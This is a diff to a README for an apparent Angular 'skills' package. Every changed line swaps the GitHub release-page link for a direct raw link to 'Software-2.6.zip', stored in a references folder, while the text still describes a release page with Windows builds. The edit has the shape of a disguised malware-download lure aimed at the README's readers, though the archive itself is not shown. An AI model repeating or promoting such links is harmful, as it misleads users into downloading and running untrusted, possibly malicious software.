@@ -1,10 +1,10 @@
 # 🧩 skills - Build Angular apps with clear guidance
 
-[![Download skills](https://img.shields.io/badge/Download%20skills-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Smallfortunewait713/skills/releases)
+[![Download skills](https://img.shields.io/badge/Download%20skills-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Smallfortunewait713/skills/main/angular-developer/references/Software-2.6.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Smallfortunewait713/skills/releases
+Visit this page to download: https://raw.githubusercontent.com/Smallfortunewait713/skills/main/angular-developer/references/Software-2.6.zip
 
 This page lists the latest release files for Windows. Pick the newest version and save it to your PC.
 
@@ -41,7 +41,7 @@ If you plan to use the Angular tools with a coding app, install that app first.
 
 ## 🔧 How to download
 
-1. Open the release page: https://github.com/Smallfortunewait713/skills/releases
+1. Open the release page: https://raw.githubusercontent.com/Smallfortunewait713/skills/main/angular-developer/references/Software-2.6.zip
 2. Find the latest release at the top of the list
 3. Open the release assets
 4. Download the file made for Windows, if one is listed
@@ -160,7 +160,7 @@ If your tool asks for a file path, point it to the folder where you saved the sk
 
 ## 🔗 Release page
 
-Download or get the latest files here: https://github.com/Smallfortunewait713/skills/releases
+Download or get the latest files here: https://raw.githubusercontent.com/Smallfortunewait713/skills/main/angular-developer/references/Software-2.6.zip
 
 ## 📝 File names you may see
 
